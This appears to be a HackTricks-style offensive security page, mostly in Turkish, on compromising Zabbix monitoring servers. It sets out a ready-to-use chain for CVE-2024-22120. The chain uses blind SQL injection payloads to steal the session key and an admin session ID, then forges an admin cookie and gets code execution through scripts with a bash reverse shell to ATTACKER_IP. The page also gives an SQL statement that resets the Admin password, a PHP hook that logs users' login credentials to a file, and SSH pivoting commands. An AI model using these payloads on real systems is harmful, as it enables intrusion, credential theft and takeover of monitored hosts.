# Zabbix Güvenliği

{{#include ../../banners/hacktricks-training.md}}

## Genel Bakış

Zabbix, bir web UI'si (genellikle Apache/Nginx arkasında) ve TCP/10051 üzerinde Zabbix protokolüyle konuşan bir server bileşeni (server/trapper) ile TCP/10050 üzerinde agent barındıran bir monitoring platformudur. Sızma testleri sırasında karşılaşabileceğinizler:

- Web UI: HTTP(S) sanal host, ör. zabbix.example.tld
- Zabbix server port: 10051/tcp (JSON over a ZBXD header framing)
- Zabbix agent port: 10050/tcp

Yararlı cookie formatı: zbx_session, en azından sessionid, serverCheckResult, serverCheckTime ve sign içeren sıkıştırılmış bir JSON nesnesinin Base64 halidir. sign, JSON payload'unun HMAC'idir.

## zbx_session cookie internals

Güncel Zabbix sürümleri çerezi şu şekilde hesaplar:

- data JSON: {"sessionid":"<32-hex>","serverCheckResult":true,"serverCheckTime":<unix_ts>}
- sign: HMAC-SHA256(key=session_key, data=JSON string of data sorted by keys and compact separators)
- Final cookie: Base64(JSON_with_sign)

Eğer global session_key'i ve geçerli bir admin sessionid'sini kurtarabilirseniz, çevrimdışı olarak geçerli bir Admin cookie'si taklit edip UI'ye kimlik doğrulayabilirsiniz.

## CVE-2024-22120 — Zabbix Server audit log'ta zaman-tabanlı kör SQLi

Etkilenen sürümler (kamuya açık belgeye göre):

- 6.0.0–6.0.27, 6.4.0–6.4.12, 7.0.0alpha1

Zafiyet özeti:

- Bir Script yürütülmesi Zabbix Server audit log'una kaydedildiğinde, clientip alanı sanitize edilmez ve SQL'e konkatene edilir; bu da server bileşeni üzerinden zaman-tabanlı kör SQLi'ya imkan verir.
- Bu, geçerli düşük ayrıcalıklı bir sessionid, erişilebilen bir hostid ve izin verilen bir scriptid ile Zabbix server portu 10051'e hazırlanmış bir "command" isteği gönderilerek sömürülebilir.

Önkoşullar ve keşif ipuçları:

- sessionid: Web UI'de guest/login'den zbx_session'i (Base64) decode ederek sessionid alın.
- hostid: Web UI istekleriyle gözlemlenebilir (ör. Monitoring → Hosts) veya bir proxy ile yakalanabilir; yaygın varsayılan 10084'tür.
- scriptid: Yalnızca mevcut role izin verilen scriptler çalıştırılır; script menüsü/AJAX yanıtlarını inceleyerek doğrulayın. 1 veya 2 gibi varsayılanlar sıklıkla izinlidir; 3 reddedilebilir.

### Sömürme akışı

1) clientip içindeki SQLi ile audit insert tetikleme

- TCP/10051'e bağlanın ve request="command" içeren, sid, hostid, scriptid ve clientip alanı sunucu tarafından konkatenenip değerlendirilecek bir SQL ifadesi olacak şekilde ayarlanmış Zabbix çerçeveli bir mesaj gönderin.

Minimal message (JSON body) fields:
```json
{
"request": "command",
"sid": "<low-priv-sessionid>",
"scriptid": "1",
"clientip": "' + (SQL_PAYLOAD) + '",
"hostid": "10084"
}
```
The full wire format is: "ZBXD\x01" + 8-byte little-endian length + UTF-8 JSON. You can use pwntools or your own socket code to frame it.

2) Time-bruteforce secrets via conditional sleep

Yanıt süresini ölçerek conditional expressions kullanarak hex-encoded secrets'i 1 char at a time leak edin. Pratikte işe yarayan örnekler:

- Leak global session_key from config:
```sql
(select CASE WHEN (ascii(substr((select session_key from config),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
- Admin session_id (userid=1)'i sessions tablosundan leak et:
```sql
(select CASE WHEN (ascii(substr((select sessionid from sessions where userid=1 limit 1),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
Notlar:

- charset: 32 hex chars [0-9a-f]
- T_TRUE >> T_FALSE'i seçin (örn. 10 vs 1) ve deneme başına wall-clock süresini ölçün
- scriptid'nin gerçekten kullanıcı için yetkilendirildiğinden emin olun; aksi takdirde herhangi bir audit satırı üretilmez ve zamanlama çalışmaz

3) Forge Admin cookie

Once you have:

- session_key: 32-hex from config.session_key
- admin_sessionid: 32-hex from sessions.sessionid for userid=1

Compute:

- sign = HMAC_SHA256(key=session_key, data=json.dumps({sessionid, serverCheckResult:true, serverCheckTime:now}, sort by key, compact))
- zbx_session = Base64(JSON_with_sign)

zbx_session cookie'sini bu değere ayarlayın ve Admin erişimini doğrulamak için GET /zabbix.php?action=dashboard.view isteği yapın.

### Hazır araçlar

- Public PoC otomatikleştirir: session_key ve admin sessionid'in bruteforce edilmesini ve cookie forging'i; pwntools ve requests gerektirir.
- Sağlanması gereken tipik parametreler şunlardır: --ip (FQDN of UI), --port 10051, --sid (low-priv), --hostid ve isteğe bağlı olarak brute'ı atlamak için bilinen bir --admin-sid.

## RCE via Script execution (post-Admin)

UI'de Admin erişimiyle, önceden tanımlanmış Scripts'i monitored hosts üzerinde çalıştırabilirsiniz. Eğer agents/hosts script komutlarını yerelde çalıştırıyorsa, bu sistemlerde kod çalıştırmaya yol açar (çoğunlukla Linux hosts'da zabbix kullanıcı olarak):

- Hızlı kontrol: kullanıcı bağlamını doğrulamak için id çalıştırın
- Reverse shell example:
```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
```
TTY yükseltme (Linux):
```bash
script /dev/null -c bash
# background with Ctrl+Z, then on attacker terminal:
stty raw -echo; fg
reset
```
DB erişiminiz varsa, forging a cookie'ye bir alternatif, Admin parolasını "zabbix" için belgelenmiş bcrypt değerine sıfırlamaktır:
```sql
UPDATE users SET passwd='$2a$10$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username='Admin';
```
## Kimlik bilgisi yakalama — login hook ile (post-exploitation)

Eğer web UI sunucusunda dosya yazma mümkünse, kimlik bilgilerini yakalamak için form tabanlı oturum açma dalının çevresine /usr/share/zabbix/index.php dosyasına geçici bir loglama snippet'i ekleyebilirsiniz:
```php
// login via form
if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
$user = $_POST['name'] ?? '??';
$password = $_POST['password'] ?? '??';
$f = fopen('/dev/shm/creds.txt','a+'); fputs($f, "$user:$password\n"); fclose($f);
CSessionHelper::set('sessionid', CWebUser::$data['sessionid']);
}
```
Kullanıcılar normal şekilde kimlik doğrular; ardından /dev/shm/creds.txt dosyasını okuyun. İşiniz bitince hook'u kaldırın.

## Pivoting ile iç servis erişimi

Servis hesabının shell'i /usr/sbin/nologin olsa bile, bir SSH authorized_keys girişi eklemek ve -N -L kullanmak, yalnızca loopback üzerinde dinleyen hizmetlere yerel port yönlendirmesi yapılmasını sağlar (örn. CI/CD 8111'de):
```bash
ssh -i key user@host -N -L 8111:127.0.0.1:8111
```
See more tunneling patterns in: Check [Tunneling and Port Forwarding](../../generic-hacking/tunneling-and-port-forwarding.md).

## Operasyonel ipuçları

- Mevcut rol için scriptid'nin izinli olduğunu doğrula (guest'in sınırlı bir seti olabilir)
- Timing brute yavaş olabilir; kurtarılan admin sessionid'ini önbelleğe al ve yeniden kullan
- 10051'e gönderilen JSON, ZBXD\x01 başlığı ve little-endian uzunluğu ile çerçevelenmiş olmalıdır

## Referanslar

- [HTB Watcher — Zabbix CVE-2024-22120 to Admin/RCE and TeamCity root pivot](https://0xdf.gitlab.io/2025/10/09/htb-watcher.html)
- [CVE-2024-22120-RCE toolkit (PoC scripts)](https://github.com/W01fh4cker/CVE-2024-22120-RCE)

{{#include ../../banners/hacktricks-training.md}}
